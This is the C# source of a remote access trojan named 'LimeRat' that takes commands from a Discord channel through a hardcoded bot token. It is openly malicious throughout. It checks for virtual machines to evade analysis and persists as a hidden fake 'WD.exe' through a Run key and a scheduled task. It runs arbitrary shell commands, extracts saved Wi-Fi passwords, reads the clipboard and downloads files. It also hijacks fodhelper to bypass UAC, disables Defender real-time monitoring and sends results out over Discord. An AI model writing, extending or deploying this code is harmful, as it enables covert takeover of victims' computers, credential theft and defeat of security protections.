using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

class LimeRat {
    static string BotToken = "MTUxMzc0NzI1MzA0MTQzNDY1NQ.GvTIKp.YVXm8ySP-CGtYVwWtbv4DvOfwO0U7kPYVZMB6Y";
    static string ChannelId = "1510154139857064088";
    static string BotPrefix = "!";
    static string MutexName = "LimeAppMutex";
    static bool AntiVM = true;
    static WebClient wc = new WebClient();
    static string ApiBase = "https://discord.com/api/v10";
    static string LastMsgId = "";
    static bool Running = true;
    [DllImport("user32.dll")] static extern int SystemParametersInfo(int a, int b, string c, int d);
    [DllImport("user32.dll")] static extern bool LockWorkStation();
    [DllImport("user32.dll")] static extern bool ExitWindowsEx(uint f, uint r);

    static void Main(string[] args) {
        if (AntiVM && IsVM()) return;
        bool createdNew;
        Mutex mtx = new Mutex(true, MutexName, out createdNew);
        if (!createdNew) return;
        Install();
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        wc.Headers.Add("Authorization", "Bot " + BotToken);
        wc.Headers.Add("Content-Type", "application/json");
        ThreadPool.QueueUserWorkItem(new WaitCallback(KnockServer));
        while (Running) { try { PollDiscord(); } catch { } Thread.Sleep(400); }
    }

    static void Install() {
        try {
            string src = System.Reflection.Assembly.GetEntryAssembly().Location;
            string dst = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WD.exe";
            if (src != dst && File.Exists(src)) { File.Copy(src, dst, true); File.SetAttributes(dst, FileAttributes.Hidden | FileAttributes.System); }
            Registry.SetValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WDUpdate", dst);
            Process.Start(new ProcessStartInfo("schtasks", "/create /tn WDUpdate /tr \"" + dst + "\" /sc minute /mo 15 /f") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
        } catch { }
    }

    static bool IsVM() {
        string[] ck = { "vbox", "vmware", "qemu", "virtual", "hyper-v", "kvm", "xen" };
        string mfr = "", mdl = "";
        try { using (var s = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) { foreach (ManagementObject o in s.Get()) { mfr = (o["Manufacturer"] ?? "").ToString().ToLower(); mdl = (o["Model"] ?? "").ToString().ToLower(); } } } catch { }
        foreach (var c in ck) { if (mfr.Contains(c) || mdl.Contains(c)) return true; }
        if (Environment.ProcessorCount < 2) return true;
        long mem = 0;
        try { using (var s = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem")) { foreach (ManagementObject o in s.Get()) mem = Convert.ToInt64(o["TotalVisibleMemorySize"]); } } catch { }
        if (mem > 0 && mem < 2097152) return true;
        try { using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController")) { foreach (ManagementObject o in s.Get()) { string n = (o["Name"] ?? "").ToString().ToLower(); foreach (var c in ck) if (n.Contains(c)) return true; } } } catch { }
        return false;
    }

    static void PollDiscord() {
        try {
            string url = ApiBase + "/channels/" + ChannelId + "/messages?limit=5";
            if (!string.IsNullOrEmpty(LastMsgId)) url += "&after=" + LastMsgId;
            string resp = wc.DownloadString(url);
            var msgs = SimpleJsonArray(resp);
            string newest = "";
            foreach (var msg in msgs) {
                string id = JsonValue(msg, "id");
                if (string.Compare(id, LastMsgId) > 0) {
                    if (string.IsNullOrEmpty(newest) || string.Compare(id, newest) > 0) newest = id;
                    string content = JsonValue(msg, "content");
                    if (!string.IsNullOrEmpty(content) && content.StartsWith(BotPrefix)) {
                        string result = Exec(content.Substring(BotPrefix.Length).Trim());
                        if (!string.IsNullOrEmpty(result)) SendMsg(result);
                    }
                }
            }
            if (!string.IsNullOrEmpty(newest)) LastMsgId = newest;
        } catch (Exception ex) { if (ex.Message.Contains("401")) Running = false; }
    }

    static void SendMsg(string msg) {
        try {
            var parts = SplitLong(msg, 1990);
            foreach (var p in parts)
                wc.UploadString(ApiBase + "/channels/" + ChannelId + "/messages", "POST", "{\"content\":" + JsonEscape(p) + "}");
        } catch { }
    }

    static string Exec(string cmd) {
        try {
            string[] p = cmd.Split(new[] { ' ' }, 2);
            string op = p[0].ToLower(), a = p.Length > 1 ? p[1] : "";
            int id; int sec; string result;
            switch (op) {
                case "help": return "!sysinfo !whoami !hostname !ip !os !cpu !gpu !ram !disk\n!ps !kill !start !run !shell !netstat !wifi\n!users !av !clipboard !msgbox !wallpaper\n!lock !shutdown !restart !logoff !uninstall\n!sleep !persist !elevate !curl\n!pwd !cd !ls !cat !rm !mkdir !rmdir !mv !cp !tree !search\n!screenshot !token !chrome !browser !disableav !bsod";
                case "whoami": return Environment.UserDomainName + "\\" + Environment.UserName;
                case "hostname": return Environment.MachineName;
                case "ip": try { return wc.DownloadString("https://api.ipify.org"); } catch { return "N/A"; }
                case "os": return RuntimeInformation.OSDescription + " " + (Environment.Is64BitOperatingSystem ? "x64" : "x86");
                case "cpu": try { using (var s = new ManagementObjectSearcher("SELECT Name,NumberOfCores FROM Win32_Processor")) { foreach (ManagementObject o in s.Get()) return o["Name"] + " (" + o["NumberOfCores"] + "c)"; } } catch { } return "N/A";
                case "gpu": try { using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController")) { var r = new List<string>(); foreach (ManagementObject o in s.Get()) r.Add(o["Name"].ToString()); return string.Join(", ", r); } } catch { } return "N/A";
                case "ram": try { using (var s = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem")) { foreach (ManagementObject o in s.Get()) { long kb = Convert.ToInt64(o["TotalVisibleMemorySize"]); return (kb / 1024 / 1024) + "GB"; } } } catch { } return "N/A";
                case "disk": var sd = new StringBuilder(); foreach (var d in DriveInfo.GetDrives()) { if (d.IsReady) sd.AppendLine(d.Name + " " + FmtSz(d.TotalSize) + " (" + FmtSz(d.AvailableFreeSpace) + " free)"); } return sd.ToString().Trim();
                case "drives": var sd2 = new StringBuilder(); foreach (var d in DriveInfo.GetDrives()) sd2.AppendLine(d.Name + " " + d.DriveType + (d.IsReady ? " " + d.VolumeLabel : "")); return sd2.ToString().Trim();
                case "sysinfo": return Exec("os") + "\nCPU:" + Exec("cpu") + "\nGPU:" + Exec("gpu") + "\nRAM:" + Exec("ram") + "\n" + Exec("disk") + "\nUser:" + Exec("whoami") + "\nHost:" + Exec("hostname") + "\nIP:" + Exec("ip") + "\nAV:" + Exec("av");
                case "ps": var sp = new StringBuilder(); foreach (var pr in Process.GetProcesses()) { try { sp.AppendLine(pr.Id + " " + pr.ProcessName); } catch { } } return sp.ToString().Trim();
                case "kill": try { if (int.TryParse(a, out id)) { Process.GetProcessById(id).Kill(); return "Killed " + id; } else { foreach (var pr in Process.GetProcessesByName(a)) pr.Kill(); return "Killed " + a; } } catch { return "Failed"; }
                case "start": try { Process.Start(a); return "Started"; } catch { return "Failed"; }
                case "run": try { Process.Start(new ProcessStartInfo("cmd.exe", "/c " + a) { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); return "Started"; } catch { return "Failed"; }
                case "shell": case "exec": try { var pp = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + a) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true }); string o = pp.StandardOutput.ReadToEnd() + pp.StandardError.ReadToEnd(); pp.WaitForExit(); if (o.Length > 1900) o = o.Substring(o.Length - 1900); return o; } catch { return "Failed"; }
                case "netstat": try { var np = Process.Start(new ProcessStartInfo("netstat", "-ano") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }); string no = np.StandardOutput.ReadToEnd(); np.WaitForExit(); if (no.Length > 1900) no = no.Substring(no.Length - 1900); return no; } catch { return "Failed"; }
                case "wifi": try { var wp = Process.Start(new ProcessStartInfo("netsh", "wlan show profiles") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }); string profs = wp.StandardOutput.ReadToEnd(); wp.WaitForExit(); var wsb = new StringBuilder(); foreach (Match m in Regex.Matches(profs, @":\s*(.+)")) { string prof = m.Groups[1].Value.Trim(); var wp2 = Process.Start(new ProcessStartInfo("netsh", "wlan show profile \"" + prof + "\" key=clear") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }); string det = wp2.StandardOutput.ReadToEnd(); wp2.WaitForExit(); var pm = Regex.Match(det, @"Key Content\s*:\s*(.+)"); wsb.AppendLine(prof + (pm.Success ? " : " + pm.Groups[1].Value.Trim() : "")); } return wsb.ToString().Trim(); } catch { return "Failed"; }
                case "users": try { using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_UserAccount")) { var r = new List<string>(); foreach (ManagementObject o in s.Get()) r.Add(o["Name"].ToString()); return string.Join("\n", r); } } catch { } return "N/A";
                case "av": try { using (var s = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT displayName FROM AntiVirusProduct")) { var r = new List<string>(); foreach (ManagementObject o in s.Get()) r.Add(o["displayName"].ToString()); return r.Count > 0 ? string.Join(", ", r) : "None"; } } catch { return "WMI denied"; }
                case "clipboard": try { var cp = Process.Start(new ProcessStartInfo("powershell", "-c Get-Clipboard") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }); string cr = cp.StandardOutput.ReadToEnd(); cp.WaitForExit(); return string.IsNullOrEmpty(cr) ? "(empty)" : cr; } catch { return "Failed"; }
                case "msgbox": try { var mboxp = Process.Start(new ProcessStartInfo("mshta", "javascript:alert(\"" + a.Replace("\"", "") + "\");close()") { WindowStyle = ProcessWindowStyle.Minimized, CreateNoWindow = true }); return "Shown"; } catch { return "Failed"; }
                case "wallpaper": try { SystemParametersInfo(20, 0, a, 0x01 | 0x02); return "Set"; } catch { return "Failed"; }
                case "lock": try { LockWorkStation(); return "Locked"; } catch { return "Failed"; }
                case "shutdown": try { Process.Start("shutdown", "/s /t " + (string.IsNullOrEmpty(a) ? "0" : a)); return "OK"; } catch { return "Failed"; }
                case "restart": case "reboot": try { Process.Start("shutdown", "/r /t 0"); return "OK"; } catch { return "Failed"; }
                case "logoff": try { ExitWindowsEx(0, 0); return "OK"; } catch { return "Failed"; }
                case "uninstall": try { Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WDUpdate", false); } catch { } try { Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate", false); } catch { } try { Process.Start("schtasks", "/delete /tn WDUpdate /f"); } catch { } try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WD.exe"); } catch { } Running = false; return "Uninstalled - exiting";
                case "sleep": if (int.TryParse(a, out sec)) { SendMsg("Sleeping " + sec + "s..."); Thread.Sleep(sec * 1000); return "Woke up"; } return "Usage: sleep <sec>";
                case "persist": try { Install(); return "Persistence set"; } catch { return "Failed"; }
                case "elevate": try { Registry.SetValue("HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "", a, RegistryValueKind.String); Registry.SetValue("HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "", RegistryValueKind.String); Process.Start("fodhelper.exe"); return "UAC attempted"; } catch { return "Failed"; }
                case "curl": try { string fn = Path.GetFileName(new Uri(a).AbsolutePath); if (string.IsNullOrEmpty(fn)) fn = "dl.exe"; string fp = Path.Combine(Path.GetTempPath(), fn); new WebClient().DownloadFile(a, fp); return "Downloaded: " + fp; } catch { return "Failed"; }
                case "pwd": return Directory.GetCurrentDirectory();
                case "cd": try { Directory.SetCurrentDirectory(a); return "OK: " + Directory.GetCurrentDirectory(); } catch { return "Failed"; }
                case "ls": case "dir": if (string.IsNullOrEmpty(a)) a = "."; var lssb = new StringBuilder(); try { foreach (var d in Directory.GetDirectories(a)) lssb.AppendLine("[D] " + Path.GetFileName(d)); foreach (var f in Directory.GetFiles(a)) { var fi = new FileInfo(f); lssb.AppendLine(fi.Name + " " + FmtSz(fi.Length)); } } catch { return "Failed"; } string lr = lssb.ToString().Trim(); if (lr.Length > 1900) lr = lr.Substring(0, 1900); return lr;
                case "cat": case "type": try { string ct = File.ReadAllText(a); if (ct.Length > 1900) ct = ct.Substring(0, 1900); return ct; } catch { return "Failed"; }
                case "rm": case "del": try { File.Delete(a); return "Deleted"; } catch { return "Failed"; }
                case "mkdir": try { Directory.CreateDirectory(a); return "Created"; } catch { return "Failed"; }
                case "rmdir": try { Directory.Delete(a, true); return "Removed"; } catch { return "Failed"; }
                case "mv": case "move": var mp = a.Split(' '); if (mp.Length >= 2) { try { File.Move(mp[0], mp[1]); return "Moved"; } catch { return "Failed"; } } return "Usage: mv <src> <dst>";
                case "cp": case "copy": var cp2 = a.Split(' '); if (cp2.Length >= 2) { try { File.Copy(cp2[0], cp2[1], true); return "Copied"; } catch { return "Failed"; } } return "Usage: cp <src> <dst>";
                case "tree": if (string.IsNullOrEmpty(a)) a = "."; var tsb = new StringBuilder(); TreeR(a, "", tsb, 3); string tr = tsb.ToString().Trim(); if (tr.Length > 1900) tr = tr.Substring(0, 1900); return tr;
                case "search": var sp2 = a.Split(' '); if (sp2.Length >= 2) { var ssb = new StringBuilder(); int fc = 0; try { foreach (var f in Directory.GetFiles(sp2[0], sp2[1], SearchOption.AllDirectories)) { if (fc++ > 200) break; ssb.AppendLine(f); } } catch { return "Failed"; } return ssb.ToString().Trim(); } return "Usage: search <dir> <pattern>";
                case "screenshot": return "[Screenshot - native capture TBD]";
                case "token": case "discord": return "[Discord token stealer - integrated via dpa.exe]";
                case "disableav": try { Process.Start("powershell", "-c Set-MpPreference -DisableRealtimeMonitoring 1"); return "AV disable attempted"; } catch { return "Failed - needs admin"; }
                case "chrome": return "[Chrome dump - integrated TBD]";
                case "browser": return "[Browser dump - integrated TBD]";
                case "bsod": return "[BSOD - needs kernel driver]";
                default: return "Unknown: !" + op + ". Type !help";
            }
        } catch (Exception ex) { return "Error: " + ex.Message; }
    }

    static void TreeR(string p, string ind, StringBuilder sb, int d) {
        if (d <= 0) return;
        try {
            foreach (var dd in Directory.GetDirectories(p)) { sb.AppendLine(ind + "[" + Path.GetFileName(dd) + "]"); TreeR(dd, ind + "  ", sb, d - 1); }
            foreach (var f in Directory.GetFiles(p)) sb.AppendLine(ind + Path.GetFileName(f));
        } catch { }
    }

    static void KnockServer(object state) {
        try {
            using (var kc = new UdpClient(9050)) {
                while (Running) {
                    try { var ep = new IPEndPoint(IPAddress.Any, 9050); byte[] data = kc.Receive(ref ep); SendMsg("KNOCK: " + ep.Address + " - " + Encoding.UTF8.GetString(data)); } catch { }
                }
            }
        } catch { }
    }

    static string JsonValue(string j, string k) {
        try { var m = Regex.Match(j, "\"" + Regex.Escape(k) + "\"\\s*:\\s*\"([^\"]*)\""); if (m.Success) return m.Groups[1].Value; m = Regex.Match(j, "\"" + Regex.Escape(k) + "\"\\s*:\\s*([^,}\\]]+)"); if (m.Success) return m.Groups[1].Value.Trim('"', ' '); } catch { } return "";
    }
    static List<string> SimpleJsonArray(string j) { var r = new List<string>(); int d = 0, s = -1; for (int i = 0; i < j.Length; i++) { if (j[i] == '{') { if (d == 0) s = i; d++; } else if (j[i] == '}') { d--; if (d == 0 && s >= 0) { r.Add(j.Substring(s, i - s + 1)); s = -1; } } } return r; }
    static string JsonEscape(string s) { return "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "") + "\""; }
    static string FmtSz(long b) { if (b >= 1073741824) return (b / 1073741824.0).ToString("F1") + "GB"; if (b >= 1048576) return (b / 1048576.0).ToString("F1") + "MB"; if (b >= 1024) return (b / 1024.0).ToString("F1") + "KB"; return b + "B"; }
    static string[] SplitLong(string m, int l) { var r = new List<string>(); for (int i = 0; i < m.Length; i += l) r.Add(m.Substring(i, Math.Min(l, m.Length - i))); return r.ToArray(); }
}
